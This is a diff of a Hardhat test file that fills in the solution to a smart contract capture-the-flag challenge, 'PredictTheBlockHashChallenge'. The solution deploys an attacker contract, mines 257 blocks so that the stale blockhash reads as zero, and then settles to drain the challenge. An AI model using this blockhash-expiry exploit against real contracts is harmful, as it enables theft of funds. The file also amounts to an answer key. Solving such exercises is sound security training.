@@ -1,22 +1,20 @@
 import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
 import { expect } from 'chai';
-import { Contract } from 'ethers';
 import { ethers } from 'hardhat';
-const { utils } = ethers;
+
+import { Attacker, PredictTheBlockHashChallenge } from '../typechain-types';
 
 describe('PredictTheBlockHashChallenge', () => {
   let deployer: SignerWithAddress;
   let attacker: SignerWithAddress;
-  let target: Contract;
+  let target: PredictTheBlockHashChallenge;
 
   before(async () => {
     [attacker, deployer] = await ethers.getSigners();
 
-    target = await (
+    target = (await (
       await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
-    ).deploy({
-      value: utils.parseEther('1'),
-    });
+    ).deploy({ value: ethers.parseEther('1') })) as unknown as PredictTheBlockHashChallenge;
 
     await target.waitForDeployment();
 
@@ -24,9 +22,20 @@ describe('PredictTheBlockHashChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const AttackerFactory = await ethers.getContractFactory('Attacker');
+    const attackerContract = (await AttackerFactory.deploy(target.getAddress(), {
+      value: ethers.parseEther('1'),
+    })) as unknown as Attacker;
+
+    await attackerContract.waitForDeployment();
+
+    await attackerContract.connect(attacker).attack();
+
+    for (let i = 0; i < 257; i++) {
+      await ethers.provider.send('evm_mine');
+    }
+
+    await attackerContract.connect(attacker).settle();
 
     expect(await target.isComplete()).to.equal(true);
   });
